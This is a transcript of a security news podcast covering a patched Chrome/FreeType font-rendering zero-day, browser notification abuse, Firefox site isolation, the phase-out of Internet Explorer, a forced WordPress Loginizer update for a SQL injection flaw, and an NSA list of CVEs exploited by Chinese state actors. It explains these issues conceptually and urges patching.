LEO:  Two T1s that gave you a fraction of the speed you're getting with a single cable connection.



STEVE:  Yes, exactly, exactly.  The only thing it really had going for it was it had a lot of reliability.



LEO:  It was reliable, that's right.



STEVE:  Because, yeah, back then it was twisted pair, and they were so expensive that it was a high priority to keep them up and running.



LEO:  Yeah, 1.44 megabits.



STEVE:  Uh-huh.



LEO:  Ridiculous.  Why did we think that was a lot?



STEVE:  Yeah.  And I remember, too, when I initially, like back in the day when I was getting it, I would mention that to people.  And this is when of course people had dial-up, and they were like, you have a T1?  Oh.  It's like, okay, yeah, yeah.  But fortunately technology moves on.



We've got a bunch of stuff, speaking of technology moving on, to talk about.  There's a recently patched zero-day which hit Chrome, only the third in a year.  Fortunately Chrome doesn't have many.  But when it does, they tend to be significant because of course, as we know, it's the majority browser now on the Internet.  There's also a nice new feature that Chrome is offering we'll talk about.  We're going to take a look at site isolation, which is coming soon to Firefox, and Microsoft's announcement of Edge for Linux, which, okay, we'll talk about that.



We've got some movement in the further deprecation of IE, of course, Internet Explorer; and a potentially massive SQL injection attack that was recently dodged by more than one million WordPress sites.  So here again, WordPress, we just keep talking about this.  And as everyone knows, I shut down mine because it's like, no.  I'm just crazy to do that.  And despite the fact that this was automatically remediated, some admins of their own sites complained about the fact that they were just saved.  Anyway, we'll talk about that.



We've got some miscellany, a bit of closing-the-loop feedback, and an update on where I stand with SpinRite.  And then we're going to end by looking at the NSA's recently published list of the top 25 network vulnerabilities currently in use by malicious Chinese state actors to attack assets in the U.S.



LEO:  How many of them were leaked NSA vulnerabilities?



STEVE:  Was BlueKeep a...



LEO:  Yeah, yeah.



STEVE:  Yeah, one of them is BlueKeep.  And so I did see that.



LEO:  I bet they didn't put that in the footnotes:  "Oh, by the way, we wrote that one, mm-hmm."



STEVE:  And we do have a fun Picture of the Week that we will get to.



LEO:  All right, Steve.  Let's get to the Picture of the Day.  I see it here.



STEVE:  So it's six frames, and it just caught my funny bone.



LEO:  It's a conversation I've had many times, actually.



STEVE:  So we've got two cartoon characters standing in front of a table at the beginning.  The first one approaches, and the second one is busy writing something.  First one says, "Are you doing programming for fun?"  And the other character says, "Yeah, I love being mentally challenged."  To which the first one replies, "Well, I'm glad you've come to terms with it."  And the first one says, "Thanks."  And then we have him thinking about that for a minute, and then he scowls.  It's like, wait a minute.  What do you mean I've come to terms with being mentally challenged?



LEO:  Yes.  I like being mentally challenged.  I do, yeah, mm-hmm.  Oh, boy.



STEVE:  So anyway, speaking of being challenged, the Hacker News summed this up by writing:  "Attention readers.  If you are using Google Chrome browser on your Windows, Mac, or Linux computers, you need to update your web browsing software immediately to the latest version Google released earlier today."  And this was last week.  So even though that was last Tuesday, even my own always sort of sluggish Chrome had already updated.  But this one, our listeners may just want to make sure that they are now running 86.0.4240.111.  However, there's much more to last week's emergency update than what drove it.  But we'll start with that.



So last Tuesday's release closed five vulnerabilities.  Four were rated high severity; one was medium.  And one of those four high-severity vulnerabilities was what we were just talking about, was a zero-day that was seen exploited in the wild, being exploited by attackers who were using it to hijack targeted computers.  So that nasty one, it was numbered CVE-2020-15999.  And what's significant is that it's a heap buffer overflow in FreeType, which is the widely used, open source, font rendering library which is part of Chrome, but many other things.  Various bounty payouts were or will be made for the other four vulnerabilities, but this biggie was discovered in-house by Google's Project Zero researcher Sergei Glazunov.



But even so, even though it was found in-house, it was subjected to an accelerated seven-day public disclosure release deadline because the flaw was under active exploitation.  And that's the Project Zero guidelines.  You get 30 days for things that, like, yeah, you've got to get these things fixed.  But if it's being used, if it is a zero-day, you get a week.  As it happens, this only took one day for Google to begin pushing the update, which they did on the 20th.  It was discovered on the 19th.  They were pushing the fix one day later.  Which is interesting because it wasn't even really their problem.  It was in the FreeType library, not in Chrome.



Sergei immediately notified the FreeType developers, who also developed an emergency patch to address the issue and had it available the next day, on October 20th.  And so that's FreeType 2.10.4.  This is significant because FreeType is everywhere.  Without revealing details of the vulnerability, Ben Hawkes, who is Project Zero's technical lead, warned via Twitter that while the team has only spotted an exploit targeting Chrome users, it's absolutely possible that other projects that use any earlier versions of the FreeType library, and there will be roughly a gazillion, might also be vulnerable and are advised to deploy the fix included with FreeType v2.10.4.



He tweeted:  "While we only saw an exploit for Chrome, other users of FreeType should adopt the fix discussed here."  And then he provided a link in his tweet.  I've got the link here in the show notes.  And it is part of the stable release of FreeType, again, 2.10.4.  So what we do know, thanks to what Sergei has shared, is that the vulnerability exists in FreeType's function "Load_SBit_Png."  So it's Load_SBit_Png.  Which processes PNG images embedded into fonts.  It can be exploited by attackers to execute arbitrary code just by using specially crafted fonts with embedded PNG images, which turns out to be something that FreeType supports.  So not just curved glyphs, but you can embed images.



And since web fonts can be specified by a web page, and since the browser will go download the font and then render glyphs from those fonts, turning a theoretical FreeType flaw into an active exploit would not be difficult.  Our listeners may remember that way back when I created - remember the Off the Grid cipher, which was based upon a Latin Square?  I wanted to allow the user to choose from among a library of highly recognizable and blocky fonts.  So I purchased a bunch of fonts, web fonts, for the purpose.  And I used the web fonts system to render them in the user's browser.  Meaning that I had all those fonts online.  The style sheet on the page specified where the browser should go download that font, which it then did, and rendered on the page.  Meaning that none of this is difficult to do.



Sergei added, he said:  "The issue" - and get this, Leo.  I mean, this is just so classic.  "The issue is that libpng uses the original 32-bit values, which are saved in 'png_struct.'  Therefore, if the original width and/or height are greater than 65535..."



LEO:  They have overflow.



STEVE:  Uh-huh.  That's of course the maximum value you can store in 16 bits is 65535, "...the allocated buffer won't be able to fit the bitmap."  Sergei has also published a font file with a proof-of-concept exploit.  All of this increases the urgency of updating anything that uses the FreeType font renderer in a way that would allow an attacker to provide their own malicious font.



In this "Load_SBit_Png" function, it obtains the image width and height from the image header as 32-bit integers because that's the size of height and width in the PNG image header.  It then truncates, unfortunately, the obtained values to 16 bits in order to store them in the TrueType SBit Metrics structure, which only has room for 16 bits.  Therein lies the problem.  It then uses the stored truncated values to calculate the bitmap size, which of course will no longer be correct because they got chopped down to 16 bits.  It then allocates memory of that size for the image backing store into which it will load the image as it renders it.  And then it passes the "png_struct" and the backing store handle to the libpng function.  Meaning that, yup, not that difficult to exploit.



We also know that this bug was introduced in the June 9th, 2015 release of FreeType v2.6.  So it's been in every subsequent FreeType release for the past more than five years.  So that's a big deal.  Compared to that beauty, the other four things that were fixed in Chrome are relative yawners.  Three of them are also ranked as severe.  One's an implementation bug in Blink.  Another is a use-after-free bug in Chrome's media handling.  There's also a use-after-free bug in PDFium, which is part of Chrome.  The remaining medium severity flaw is another use-after-free issue in Chrome's printing subsystem.



And so as I mentioned, this is a zero-day.  This got fixed last Tuesday.  Everybody wants to make sure they're running the latest Chrome, and I would imagine, I mean, clearly the fact that I already had it and my Chrome never seems to be in a hurry to update, means that Google turned the intensity up on this one because, again, this one was being abused in the wild and was seen there.  And I mentioned Google has had three.  Almost a year ago there was the critical remote code execution vulnerability patched last Halloween night.  And the other was a memory confusion type bug fixed in February.  So these things are few and far between.  And of course thanks to Chrome's mature self-maintenance system, the browser, which would normally be the target for malicious abuse, it fixed it itself.



But, and this is the important takeaway, that may not be the case for every other use of FreeType.  Anywhere an attacker can access a FreeType library built after June 2015 and not updated last week, who can arrange to render their own font glyphs under FreeType, is potentially exploitable with powerful consequence.  FreeType is the font renderer in Android, in iOS and macOS.  Java uses FreeType, as does the Sony PlayStation.  Many open desktop operating systems and videogames use it.  I mean, it is the font renderer of choice, and it's been vulnerable to this for five years.



So keep an eye out for FreeType updates.  I imagine that the various Linux distros, because they're all FreeType based, that they will be pushing or probably already have because, I mean, this thing is like a fix-it-now level problem.  Again, if there's no way for a bad guy to get your system to render a custom font, you don't have a problem because that's the bar that has to be passed.  But many systems like just any web browser will do so.  So it's an important thing to fix.  And Chrome is sort of the canary in the coalmine.  It's good that it was found because that system was able to get itself fixed immediately, thanks to Chrome being in constant contact with the Internet.  And we'll be talking about this a little bit in a minute about WordPress because there's another serious problem that happened there.



Also in this Chrome, which is 86, it's now started to block I guess what I would call "slippery notifications."  I've mentioned before that I was taken aback when some site I visited prompted me to - it said "enable and allow site-based notifications."  Or that's what I knew it was asking me to do.  But in this case it was before it would allow me to proceed into the site it showed like on the page an arrow pointing up to where the permission to enable site-wide notifications appeared, and it said something like, "Please click 'Allow' to enable this website and proceed."



LEO:  No, unh-unh.  Bye-bye, website.



STEVE:  Yeah, exactly.  I hit my back button on the browser and chose another link from the search engine that brought me to this misbegotten site.  But of course we know what we're doing.  Many users are going to get caught out by this.  So the problem is that most users don't realize that this is entirely bogus and unnecessary and that what they're doing is giving that site permission to harass them with notifications which appear to be originating from their operating system, since the browser, whether they are on that site still or not, forms a conduit for subsequent messaging spam.



So fortunately Google has noticed this, too.  And what's more, they've observed sites using notifications for active malicious purposes, including sending malware to or mimicking system messages attempting to obtain user login credentials.  So, I mean, again, this just seems like a bad idea, the whole thing, the whole idea of like this background messaging thing.  But maybe that's just me.  Google's Web Platform Project Manager PJ McLachlan said:  "Abusive notification prompts are one of the top user complaints we receive about Chrome."



So, starting with v86, Chrome will be automatically suppressing website notification spam on all sites which have shown a pattern of sending abusive notification content to their visitors.  PJ said:  "Our goal with these changes is to improve the experience for Chrome users and to reduce the incentive for abusing sites to misuse the web notifications feature."  And this has been on Google's radar since v80 of Chrome.  So they've been working on it kind of quietly in the background to refine its operation.  And they've been a bit crafty.



Google's web spiders will subscribe to push notifications if push permissions are requested when the spider visits the site.  That allows the spidering to predetect websites which may be misusing these notifications for the purpose of subsequently spamming their previous visitors to the site.  And if such behavior is noticed, the spiders will use Google's safe browsing blacklist service to evaluate received notifications and automatically flag the site as abusing notifications for unwanted purposes, at which point that message goes out Chrome-wide, and notifications will just shut down from that site.



So as I said, I've never been a big fan of offsite browser push notifications.  I suppose there are valid use cases for them.  And as we become more browser-centric, more of our life gets spent doing browser-based apps that I guess receiving asynchronous notifications might make sense.  But mostly I find I want to interact with a site by going there.  And then when I close that tab, it's like okay, fine, I'm done with this now.  Again, maybe I'm just a cranky old guy.  But I've not seen a big use for them.  What about you, Leo?  Has that...



LEO:  There are some.  If you use Google Calendar, the web version can then notify you...



STEVE:  Like a scheduled event coming up.



LEO:  A schedule.  So there are some.  If you, for instance, want breaking news, you know, you probably have it on your phone turned on on CNN or Google.  You can also have it on your desktop.  It's similar to that, but most sites, you're right, I don't want notifications.  I really don't.  If you use Gmail as your email, and you'd like to be notified when there's a new inbox message, that kind of thing.  They're really limited applications.  It's annoying as heck.  And I agree with you.  What I do is go in the browser.



STEVE:  Globally?



LEO:  Firefox browsers and say, just don't ask me.



STEVE:  Yes, yes.



LEO:  I don't want it, yeah.



STEVE:  Yes.  So speaking of Firefox, site isolation is - we've touched on it.  It's a state-of-the-art browser security feature which offers enhanced protection against some forms of security flaws by reducing each browser tab's attack surface.  So that's always a good thing.  And in practice it reduces the likelihood that malicious code on one site might be able to access the resources of another.



Now, of course we know that browsers, by enforcing the same-origin policy, already prohibit websites from accessing each other's data.  But mistakes happen.  Security bugs occasionally arise, or sometimes new and creative ways are found to bypass these permissions.  This is one of the  consequences is that they just keep adding more and more features to these browsers.  Bad guys look at that and go, oh, you know, we can leverage this in some way that wasn't foreseen by the people who said oh, yeah, we want to compete with an operating system desktop, so let's just do everything.



So site isolation provides another perimeter of defense to make these sorts of attacks much less likely to succeed by placing web pages from different web domains into different operating system processes.  The browser is able to leverage the underlying OS's native and time-hardened inter-process isolation.  We already rely on our operating systems to keep processes contained and not misbehaving.  So if you break the browser's tabs into processes, then on one hand you get a lot more processes.  On the other hand there's already hundreds running in a modern operating system doing all kinds of stuff.  But you get more isolation.



We talked about this initially two years ago when Google added site isolation to Chrome in the middle of 2018.  That was Chrome 67.  And after seeing that feature's success in Chrome, the following February 2019 Mozilla announced their own plans to bring site isolation to Firefox.  I've been waiting for it ever since.  They named their internal re-architecting project Fission, since it splits Firefox apart into separate processes.  But doing this is much easier said than done when you're starting from a model where all the tabs live in a single browser process.  So it took both companies, both Google and Firefox, or Mozilla, about two years in a time-consuming rewrite of large portions of each browser's internal architecture.



But Firefox is finally emerging from the other side of that effort.  According to an update to the project's Fission wiki page, site isolation can now be enabled in versions of Firefox Nightly for those who like to live on the bleeding edge of browser development.  I don't.  I'm happy to wait for it to come to the release channel.  But you go to the about:config page.  If you have Firefox Nightly, if you then search for "Fission," then you'll find fission.autostart.  You set that to true.  If you also then search for gfx.webrender, set webrender.all to true, don't change anything else, just those guys.



Restart the browser.  And then if you open a few tabs and hover your mouse pointer over the tab, what you normally get is a pop-up description, like a long-form description of the title of the page.  What you'll then find is at the end is the system's process ID, the operating system process ID for the process that that page is running in, as the tool tip pop-up text over the form.



So anyway, I'm glad to have Firefox moving forward.  Clearly this sort of per-process isolation, you could imagine, if it took two years to re-architect the browser, this is the kind of thing they really wish that they had done, like, from the get-go because it's not an easy thing to change, like on the fly, downstream.  But nice to have for us users.  And I imagine it'll be - I'm sure I'll mention it as soon as it hits the standard stable distribution channel.



One last piece of news.  I have a couple more, actually.  But as we know, Microsoft's Chromium-based Edge browser, now available on Windows and Mac, iOS and Android.  The only major platform that it was missing from has been Linux.  The dev channel build of Edge for Linux is now available for download and installation.  And it's running all of Edge's new features, including smooth scrolling, Google's extensions, themes, and so forth.  So I just sort of wanted to give people a quick heads-up about that.  Since Linux can already run Chrome or Firefox, and I always seem to be running Firefox on Linux, I'm unsure why anyone would want to run Edge there.  But maybe developers, for example, might need to verify their compatibility with their stuff under Edge for Linux.  So in any event, it's there for anyone who wants it.  And I'm sure it'll be also emerging from the dev channel in due course.



One last piece of browser news.  Inertia, as we know, in the computer world is confounding.  Despite years of Microsoft pushing their users away from the increasingly antiquated Internet Explorer.  IE still commands, believe it or not, a 5%, like one in 20, market share.  It's like, wow.  And the need to move away is not just for security, although it is.  We keep running across weird VBScript problems that only IE invokes.  Anyway, security should be enough reason.  It turns out that IE has petrified.  The rest of the web has moved on.  Microsoft now maintains a list of 1,156 web domains - you might want to bring this up, Leo, I've got the link here in the show notes - 1,156 web domains which no longer work under Internet Explorer.  And this list includes...



LEO:  This is clearly wrong.  I don't know what happened.



STEVE:  Oh, yes.  When I brought mine up, I had one per line.



LEO:  It may not work in Firefox.  I'll try it in a different browser.



STEVE:  I think it might have been up because I compose in Google Docs.  So some of the things that I bring up are going to be in Google Docs.  But anyway, this list of 1,156 web domains which no longer work with IE includes Twitter, Facebook, Instagram, GoDaddy, Google Drive, Google Earth.



LEO:  What?  Geez, everything.



STEVE:  Microsoft Teams, yes, ESPN, Yahoo Mail, and a great many more mainstream and some obscure sites.  There were some, like, how did you even know this didn't work?



LEO:  Oh, this is an XML file, Steve.



STEVE:  Yes.



LEO:  Oh, I get it, okay.



STEVE:  Yeah, because that file is being pulled by a Browser Helper Object.  We've not spoken about BHOs, Browser Helper Objects, for quite a while.  Microsoft will be installing a Browser Helper Object into any remaining and still surviving instances of IE. 



LEO:  Geez, there's a lot.  I'm just amazed, yeah.



STEVE:  Yeah.  And when one of these BHO-enhanced instances of Internet Explorer attempts to bring up any of those incompatible sites, Edge will be launched instead, along with a not-very-subtle banner recommending that the user switch to making Edge their default web browser.  So this helps Microsoft.  And Microsoft can't be blamed for the fact that some people just won't give up IE.  It's a little difficult to understand now why someone would be feeling that way.  If you're on Windows, I guess it was on XP, you weren't able to go beyond IE9, which was really old.  But then so is XP.  IE11 is where it left off.  But again, it just won't run a lot of things anymore.



So I thought it was sort of nice that Microsoft is saying, okay, you could still launch IE.  Instead of things just not working, like crashing, we'll see if it's a domain that we know about.  If so, nothing we can do but move you over to Edge, which they will do, and then suggest that the user just use Edge from now on.  So I thought that was kind of cool.



LEO:  That's amazing.  Wow, look at that.



STEVE:  Yeah.  I mean, as I said, IE has clearly fossilized.  It's just no longer functioning, no longer able to do what the web wants to.  Of course it runs GRC.com just fine because my site is also petrified.



Anyway, WordPress once again, and not in a good way, in the news.  In this week's installment of why you never want to host your own WordPress site, and also why you should really try to only run with the barest minimum of plugin add-ons, we now have the Loginizer add-on, which is installed in more than one million WordPress sites, which the WordPress security team took the rare step last week of forcing an update to, using a nearly unknown internal capability of WordPress.



It turns out that WordPress sites can be forcibly updated without their administrator's permission.  And as a result, sites running the Loginizer plugin were forcibly updated to v1.6.4.  Earlier versions of Loginizer contained a SQL injection bug that could have allowed hackers to completely take over any of those more than one million WordPress sites.  So why would more than one million WordPress instances choose to install Loginizer?  Because it promised...



LEO:  Good question.



STEVE:  Yes, exactly.  Because it promised to enhance the security of WordPress sites...



LEO:  There you go.



STEVE:  Yeah, by providing IP address, black or whitelists for accessing WordPress's login page.  Among other login-related features as, you know, Loginizer sounds like it's close to Agonizer, as it turns out, but in this case provides support for two-factor authentication or simple CAPTCHAs to block login automation.  I've got a link in the show notes to the Loginizer page at WordPress.org.  And it does, yes, it offers other things.  A lot of them are rather obscure.  My feeling is those things, most of those seem like features that should be built in natively so that users are not forced to download and obtain them through what prove to be insecure add-ons.  I'm 100% certain that the authors of these plugins are well-meaning.  But all of the evidence we've seen informs us that writing web-facing browser add-ons is not simple.  It requires extreme awareness of security, and it should not be left to random, even well-intentioned, authors.



So I get it that WordPress wants to have an active and vital add-on ecosystem to enhance their platform's offering.  But leaving popular features missing, such as at least some of those provided by Loginizer, hugely increases the footprint of exactly this sort of devastating event.  Many of those more than one million potential attack targets could have been completely sidestepped from the start if WordPress natively offered the more obvious popular and missing benefits of that add-on.  So it ought to be in the box.



While I was hosting my own WordPress site, I also employed my own IP-based filter for exactly that inherently vulnerable and abuse-prone login page.  When I was setting up WordPress, I was somewhat stunned that here was just like this login page, and you were depending upon a username and password to get access into the internals of your site.  But there was no other protection for it.  So of course, because I'm running on top of IIS, I added some rules to a web.config file which is the equivalent of the .htaccess file typically supported by Unix servers.  Easily done if you're the admin of the server, not if you don't have access down at that level.



But yes, my point is that ought to be built into WordPress.  You should not - no one should need to depend upon lower level plumbing like I was able to do, or the need to go get an add-on, no matter how popular it is, which then exposes more than a million sites to a SQL injection attack.  And what's even more weird is that it turns out this Internet-wide forced update was not without controversy.  WordPress users have unfortunately been given the impression, well, okay, because there's a setting, that they control what's done when on their sites.  There's a permission setting for allowing auto-updates.  So of course I immediately turned that on when I was setting up my WordPress installation more than a year ago.



But many old-school WordPress admins enjoy the illusion that, if they have more control, things will go better for them.  They are of course wrong.  Ryan Dewhurst is the founder and CEO of WPScan.  We've mentioned him in the past because he just sort of pops up whenever one of these horrible WordPress things happen.  He was interviewed about this.  He noted that the flaw "...allows anyone with some basic command-line skills to completely compromise a WordPress website."  And he pointed out that the flaw's discoverer had also provided a simple proof-of-concept script in a detailed write-up which was also recently published.  This was responsibly posted five days after the Internet-wide update was pushed to all known sites.  So telling the world what he had found, what the researcher who found this had found was fine because it had already been remediated.



But imagine allowing a known and powerful SQL injection attack to linger on more than one million WordPress sites.  That bug is one of the worst security issues discovered in WordPress plugins in recent years, which probably explains why the WordPress team decided to forcibly push the patch to all affected sites.  Had I been using that plugin, had I not already had "Yes, please update me all the time" turned on, and were I still using WordPress, which is not the case any longer, as I've said, then I would want that thing pushed out to me before it went public.



Ryan told ZDNet in their interview of him, he said this forced plugin update feature has been present in the WordPress codebase since v3.7, which was released seven years ago, in 2013.  He believed that it's been rarely used.  But that's not entirely clear.



He said:  "A vulnerability I myself discovered in the popular Yoast SEO WordPress plugin back in 2015 was forcibly updated."  He said:  "Although the one I discovered was not nearly as dangerous as the one discovered within the Loginizer WordPress plugin."  He said:  "I'm not aware of any other cases of forced plugin updates, but it's very likely that there have been others."  And confirming that, WordPress's core developer Samuel Wood said that the feature has been used many times, but declined to provide additional details about other instances.  So maybe on a less widespread basis, not a million-plus instances, which of course really brought it to the attention of the foreground.



As I said, not everyone was happy with WordPress's unilateral move.  Not long after the Loginizer 1.6.4 patch started reaching WordPress sites, users began complaining on the plugin's forum at WordPress.org.  One disgruntled user posted:  "Loginizer has been updated from 1.6.3 to 1.6.4 automatically, although I had NOT" - he had it all caps - "activated this new WordPress option.  How is it possible?"  Another added:  "I have the same question.  It has happened on three websites I look after, of which none of them have been set to auto-update."  Okay, so first of all, why do you have websites with auto-update turned off?  What is wrong with you?  Okay, that was rhetorical, of course.



And in a follow-up, Loginizer's developer said that the security patch had reached 89% of all sites, thanks to the forced update.  So oops, there are still, what, 11% unpatched?  I hope they get patched soon.  There's 100,000-plus WordPress websites with a well-known, now there's a proof of concept out, SQL injection vulnerability just hanging out in the breeze.  I imagine those sites will be found and compromised.  They must somehow be sites of which WordPress.org was not aware.



All of this podcast's listeners know that anything that's connected to the Internet needs to have some highly reliable means of being updated by its originator, by its source, when important problems are inevitably found.  As we know, there is now a growing body, for example, of IoT devices that have been stranded.  They've got known vulnerabilities, increasing numbers of them over time.  And none of them will ever be updated.  That just can't be the way things happen moving forward.



So my feeling is that WordPress should commandeer the best ideas from their add-on authors and implement them safely and securely.  There ought to be a built-in IP-based whitelist and blacklist.  There ought to be built-in multifactor authentication and CAPTCHAs.  You shouldn't have to download an add-on in order to have those basic security features.  I get it that they don't want to hurt their own developer ecosystem.  But their reputation is going to get more tarnished if they don't fix these problems.  And how can they because we've just got amateur, well-intended web script, PHP and JavaScript authors, doing the best they can; but that's not good enough, as we continually see, because we're seeing lots of WordPress problems.



And WordPress should firmly disabuse its platform's administrators of the idea that they can prevent the automatic updating of anything when WordPress feels that it is sufficiently important for things that are vulnerable on their WordPress installation to be updated.  The guy who complained that three of his vulnerable sites were updated without his permission to remove a critical complete site takeover should pull his head out of you know where, and WordPress ought to also make their ability to do this part of their formal policy.  They ought to have, like, maybe change the auto-update switch to auto-update critical security vulnerabilities or auto-update all, accept all updates, or only critical security vulnerabilities, rather than giving anyone the illusion that it can be completely turned off.  Clearly, for seven years it cannot be completely turned off.  Updates are going to be done.



I put this last piece under Miscellany because it's less directly related to security than it is to masochism.  The news is that the refusal of a system to perform a Windows 10 feature update may now be bypassed.  Thus, yes.  You know, if things have been going well lately, and your systems have been running without problems, and maybe you're a bit bored, then forcing Windows 10 to update against its will may be just the thing to return some excitement to your life.



Yes, it's true.  Microsoft has added a new Group Policy option that allows users to bypass the "safeguard holds," as they're called, which are placed on devices due to known conflicts with hardware or software on that machine.  Because, you know, maybe Microsoft is being overprotective, and you'll get lucky.  It could happen.  This past month's October Patch Tuesday added a new Group Policy titled "Disable Safeguards for Feature Updates."  Which is where in a chorus we all say:  "What could possibly go wrong?"



LEO:  Well, because it's Group Policy, it's probably for business users, for an IT guy who knows, has tested and says, no, no, this isn't a problem or something like that.



STEVE:  Yes, because we really need that - and I heard you and Mary Jo and Paul talking and saying that there really wasn't much that happened in H2.



LEO:  That's a good thing in H2.



STEVE:  Yes.



LEO:  Because it was really a bug fix for 04, which was a nasty, nasty update.  So that's a good thing in this case.



STEVE:  Yeah.



LEO:  Less is better.



STEVE:  So for those who are interested, it's located under Computer Configuration > Administrative Templates > Windows Components > Windows Update and, Leo, as you predicted, Windows Update for Business.  So it's there.



LEO:  Don't do it at home.  Most people are not using Group Policy Edit at home.



STEVE:  Well, actually everybody has it.  So, for example, any Windows 10 Pro.



LEO:  The Pro versions have it, yeah.



STEVE:  Yeah, yeah.  So you are able to go to gpedit.msc, and that'll bring it up.  And there are some things that I've done in there where I wanted to tweak the way Windows, you know...



LEO:  No, it's a useful tool, yeah.



STEVE:  Yeah, yeah.



LEO:  But don't force the update, please.



STEVE:  No.  Again, I just couldn't resist.  It's like, really?  You want to allow people to do this?  Because, yeah, what could possibly happen?  So anyway, I know that some of our listeners like to walk on the wild side.  Here's your ticket, if things have been going too well for you lately.



I had a nice bit of feedback for Closing the Loop from a DavidMD.  He said:  "Hi, Steve.  A little late here, but AdFind, typically pronounced A-D-Find, as in Active Directory Find" - and remember we talked about this last week in the context of Ryuk because that was one of the tools that the forensics examination found being used.  It had been downloaded from that site that was pretty much full of Active Directory stuff.



Anyway, David provided a little background.  He said:  "It's an awesome admin tool for those of us in corporate Windows environments."  He said:  "I actually know Joe.  We used to work together at HP, and he's been a Microsoft MVP for Active Directory for over a decade.  He knows his structured directories very well.  AdFind can even be used to query OpenLDAP directories."  He said:  "It's unfortunate that his tools have been used by malicious parties, but that seems to be more a function of the utility of his tools rather than a reflection on his motives."  And of course I completely agree.  We never meant to imply that Joe had any but the best of uses in mind.  Of course, you know, anything can be turned for a malign purpose.



Anyway, he said:  "I just wanted to speak up and defend Joe, though I think he'd be the first to agree with you on his website design chops."  He said:  "Probably why his tools are all CLI.  Love the podcast.  Keep up the great work."



LEO:  Command Line Interface, yeah.



STEVE:  That's right.  So thank you, David, for providing that bit of background.



LEO:  It's a lot easier to write command line tools than have GUIs, I have to admit.



STEVE:  It is indeed.  So a little quickie on SpinRite.  The work on SpinRite is progressing very well.  We're getting tantalizingly close to the first release candidate of the ReadSpeed Benchmark.  During this past week I significantly rewrote a chunk of the benchmark that will be important for SpinRite.  As I mentioned before, I'm implementing as much of the technology that SpinRite will need as I can now, rather than later, so that more of it can be tested sort of in vivo as part of the ReadSpeed Benchmark.  The new maximum speed hardware drivers can enumerate and talk to all of a system's drives and controllers, but there will still be some drives that this new code doesn't yet handle, such as USB-connected devices.  That'll be added immediately following the addition of UEFI booting and operation for SpinRite.



But I wanted to get directly connected parallel IDE and all serial SATA drives running at lightning speed first.  And that means synchronizing the BIOS's view of the system's drives with the new view that this code provides from the PCI bus.  And all of that work now appears to be working much better than I had hoped and expected as a result of the testing that we did in the last few days.  So I'm working with a couple of testers to eliminate some of the one-off side effects of that rewrite.  Then we'll move to the first release candidate of ReadSpeed.



Also GRC's web forums are bubbling along nicely.  We've got more than 3,700 registered users, and generally around 80 or so visitors just poking around and looking, you know, reading the threads for which you don't have to register.  Although I originally created the forums as a place for GRC project and product support, there was so much interest in just hanging out and chatting that I ended up creating an array of topic-centric groups to better organize the community that has been forming.  So now we have a dedicated Security Now! podcast forum, and also forums for discussing security, networking, operating systems, software, hardware, coding, health, nerd recreation, sci-fi, and one titled "None of the Above."



So anyway, that's also turned into a fun place to hang.  And once the ReadSpeed Benchmark is ready, that'll be the place to go to report and discuss your results and to tell me about any problems that you might encounter.  The whole point of this is to essentially perform an early verification of SpinRite's forthcoming technology.  If ReadSpeed works on your systems, from booting through obtaining results, then so will the next release of SpinRite.  So we're getting close.  And I'm being eliminated by the glow of my screen.



LEO:  Yeah, it's very bright in there.  Can you turn the brightness down?  Are you in a nuclear reactor?  I don't know what's going on.  No, that's all right.



STEVE:  It's whitening my teeth.



LEO:  Yeah, look at that.  Yeah, they're going to look beautiful.



STEVE:  So last week the U.S. National Security Agency, our NSA, published a detailed report enumerating the top 25 well-known security vulnerabilities that are currently being consistently scanned, targeted, and exploited by Chinese state-sponsored hacking groups.  And I don't know why they picked on China because we know that China's not alone.  



LEO:  I know why.  Don't you?



STEVE:  I do, too.  But we'll just move past that.



LEO:  It's pronounced Chi-na.



STEVE:  So anyone who follows this podcast will already know or presume it is today's security reality, which might have been a good name for this podcast, actually, that all 25 of these vulnerabilities are well-known and have had patches available from their vendors typically for months or years.  There's one that is still being attacked that is Symantec's we'll get to.  It was fixed in 2017.  Yet it's on the top 25 list, amazingly.  The development of exploits for many of these is of course hugely aided by the nature of vulnerability disclosure these days; right?  The vulnerability is found.  It's responsibly disclosed, often.



For example, Zerologon, which is this horrible problem that we're suffering through right now, was found responsibly disclosed.  Microsoft patched it.  The group that found it, I can't remember their name, but they waited six weeks.  Two Patch Tuesdays went by before they finally talked about it.  That wasn't long enough because they then provided enough information that bad guys said, oh, thank you very much, we're just going to attack all those systems that have not been updated in the last two months.



LEO:  That's the problem.  You can give the company time to fix it, to offer a patch.  But people have to apply the patch.



STEVE:  Yes.



LEO:  And they don't.



STEVE:  Yes, which is exactly why in my previous WordPress rant I was saying, yes, WordPress should be able to push out something like this, and no one should complain.  People should be saying "Thank you, WordPress, for protecting me," rather than "How dare you touch my site?"



LEO:  We only recommend buying IoT devices that automatically update for that very reason; right?



STEVE:  Yup.  So of course then proofs of concept are published, making it trivial to create working exploits.  And it's not just state-sponsored Chinese hackers who are making hay.  We've seen many of these flaws incorporated into the attack kits of ransomware gangs, malware groups, and nation-state actors from other countries, including Russia and Iran.



Okay.  So introducing this six-page list, the NSA said:  "One of the greatest threats to U.S. National Security Systems, the U.S. Defense Industrial Base, and Department of Defense information networks is Chinese state-sponsored malicious cyber activity."  Okay.  One of.  Yeah, one of many.  Because of course everybody knows about these.  These are not just secret things.  Notice that they all have CVEs.  The top 25 are all known.  It's not like they're secret things that China figured out that we don't have a number for.  No, they're all patched, except not.



Anyway, they said:  "These networks often undergo a full array of tactics and techniques used by" - again, uh-huh - "Chinese state-sponsored cyber actors to exploit computer networks of interest that hold sensitive intellectual property, economic, political, and military information.  Since these techniques include exploitation of publicly known vulnerabilities, it is critical that network defenders prioritize patching and mitigation efforts."



They said:  "The same process for planning the exploitation of a computer network by any sophisticated cyber actor is used by Chinese state-sponsored hackers."  Boy, they really do want to focus on China.  "They often first identify a target, gather technical information on the target, identify any vulnerabilities associated with the target, develop or re-use an exploit for those vulnerabilities, and then launch their exploitation operation."



And they finish, saying:  "This advisory provides Common Vulnerabilities and Exposures (CVEs) known to be recently leveraged, or scanned-for, by Chinese state-sponsored cyber actors to enable successful hacking operations against a multitude of victim networks.  Most of the vulnerabilities listed below can be exploited to gain initial access to victim networks using products that are directly accessible from the Internet and act as gateways to internal networks."  And, finally, "The majority of the vulnerable products are either used for remote access or for external web services, and should be prioritized for immediate patching."



